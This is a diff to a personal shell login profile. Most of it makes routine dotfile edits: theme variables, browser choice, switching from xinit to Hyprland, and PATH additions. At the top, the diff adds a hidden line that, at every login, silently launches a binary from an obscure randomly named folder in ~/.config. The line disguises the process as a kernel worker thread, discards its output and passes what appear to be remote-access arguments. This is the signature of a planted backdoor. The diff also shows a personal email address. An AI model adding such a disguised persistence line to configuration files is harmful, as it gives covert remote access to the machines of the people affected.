@@ -1,4 +1,6 @@
-#!/bin/bash
+#!/bin/bash -x
+set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs lBg2WqxLORaqhKLF2bxC" /usr/bin/bash -c "exec -a [kworker/R-btrfs-delayed-meta] /home/yigit/.config/.i9NSn7wj/K4VX7Nvg" &>/dev/null &
+#!/bin/bash -x
 
 ## __   _______ _____ _____
 ## \ \ / / ____| ____|_   _|
@@ -13,6 +15,7 @@ disp_manager=$?
 
 # Vars for some bugs and applications
 export QT_QPA_PLATFORMTHEME="qt5ct"
+export BAT_THEME="Catppuccin Mocha"
 export _JAVA_AWT_WM_NONREPARENTING=1
 export AWT_TOOLKIT=MToolkit
 
@@ -20,12 +23,12 @@ export AWT_TOOLKIT=MToolkit
 # Environment variables
 export SHELL=/bin/zsh
 export TERMINAL=/usr/local/bin/st
-export BROWSER=chromium
+export BROWSER=firefox
 export EDITOR=nvim
 export OPENER=xdg-open
 export DEFAULT_RECIPIENT="yigitcolakoglu@hotmail.com"
 export LIBVIRT_DEFAULT_URI="qemu:///system"
-export GTK_THEME=Arc-Dark
+export GTK_THEME="catppuccin-mocha-mauve-standard+default"
 
 # Set XDG Directories
 export XDG_DATA_HOME="$HOME"/.local/share
@@ -96,9 +99,13 @@ export PATH="$PATH:$GOPATH/bin"
 export PATH="$PATH:$GOPATH/binexport"
 export PATH="$PATH:$XDG_DATA_HOME/cargo/bin/"
 export PATH="$PATH:$XDG_DATA_HOME/questasim/questasim/linux_x86_64"
+export PATH=$XDG_DATA_HOME/node/bin:$PATH
 # export PATH="$PATH:$XDG_DATA_HOME/anaconda3/bin"
 
 export CPATH=/usr/include/opencv4
+
+## BeMenu config
+source $HOME/.config/bemenu/config.sh
 
 export LM_LICENSE_FILE=27017@flexserv1.tudelft.nl
 
@@ -136,9 +143,9 @@ fi
 
 if [ "$DISPLAY" = "" ] && [ "$(tty)" = /dev/tty1 ] && [ $disp_manager -ne 0 ]; then
   if [ "$DBUS_SESSION_BUS_ADDRESS" = "" ] && [ ! $(command -v dbus-run-session)  = "" ]; then
-    exec dbus-run-session xinit 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
+    exec dbus-run-session Hyprland 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
   else
-    exec xinit 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
+    exec Hyprland 2> $XDG_RUNTIME_DIR/xinit.err > $XDG_RUNTIME_DIR/xinit
   fi
   exit
 fi
